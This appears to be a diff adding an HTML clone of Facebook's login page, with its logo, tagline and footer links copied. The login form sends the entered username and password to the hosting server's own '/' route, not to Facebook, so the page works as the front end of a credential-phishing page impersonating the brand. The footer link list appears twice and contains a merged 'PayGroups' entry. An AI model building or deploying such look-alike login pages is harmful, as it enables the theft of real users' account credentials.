@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <!-- <link type="image/png" sizes="16x16" rel="icon" href=".../icons8-facebook-color-16.png"> -->
+    <link type="image/png" sizes="120x120" rel="icon" href="images/fbfav.png">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="images/fb_logo.svg" alt="Logo">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="col-form">
+                <form method="POST" action="/">
+                    <div class="form-container">
+                        <input type="text" id="username" name="username" placeholder="Username" required>
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                        <button type="submit" class="btn-login">Login</button>
+                        <a href="#">Forgotten password?</a>
+                        <button class="btn-new">Create new Account</button>
+                    </div>
+                </form>
+                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-contents">
+            <ol>
+                <li>English (UK)</li>
+                <li><a href="#">മലയാളം</a></li>
+                <li><a href="#">தமிழ்</a></li>
+                <li><a href="#">తెలుగు</a></li>
+                <li><a href="#">বাংলা</a></li>
+                <li><a href="#">اردو</a></li>
+                <li><a href="#">हिन्दी</a></li>
+                <li><a href="#">ಕನ್ನಡ</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">Português (Brasil)</a></li>
+                <li><a href="#">Français (France)</a></li>
+                <li><button>+</button></li>
+            </ol>
+
+            <ol>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In </a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">People</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Page categories</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Facebook</a></li>
+                <li><a href="#">PayGroups</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Oculus</a></li>
+                <li><a href="#">Portal</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Local</a></li>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In </a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">People</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Page categories</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Facebook</a></li>
+                <li><a href="#">PayGroups</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Oculus</a></li>
+                <li><a href="#">Portal</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Local</a></li>
+            </ol>
+            <small>Meta © 2025</small>
+        </div>
+    </footer>
+    <script>
+        function adjustLayout() {
+            const row = document.querySelector('.row');
+            const colLogo = document.querySelector('.col-logo');
+            const colForm = document.querySelector('.col-form');
+            if (window.innerWidth <= 900) {
+                row.style.flexDirection = 'column';
+                row.style.alignItems = 'center';
+                row.style.gap = '20px';
+                colLogo.style.width = '100%';
+                colForm.style.width = '100%';
+                colLogo.style.maxWidth = '400px';
+                colForm.style.maxWidth = '400px';
+                colLogo.style.margin = '0 auto 20px auto';
+                colForm.style.margin = '0 auto 20px auto';
+                colLogo.style.textAlign = 'center';
+            } else {
+                row.style.flexDirection = 'row';
+                row.style.alignItems = 'center';
+                row.style.gap = '40px';
+                colLogo.style.width = '400px';
+                colForm.style.width = '400px';
+                colLogo.style.maxWidth = '';
+                colForm.style.maxWidth = '';
+                colLogo.style.margin = '';
+                colForm.style.margin = '';
+                colLogo.style.textAlign = 'left';
+            }
+        }
+        window.addEventListener('resize', adjustLayout);
+        window.addEventListener('DOMContentLoaded', adjustLayout);
+    </script>
+</body>
+
+</html>
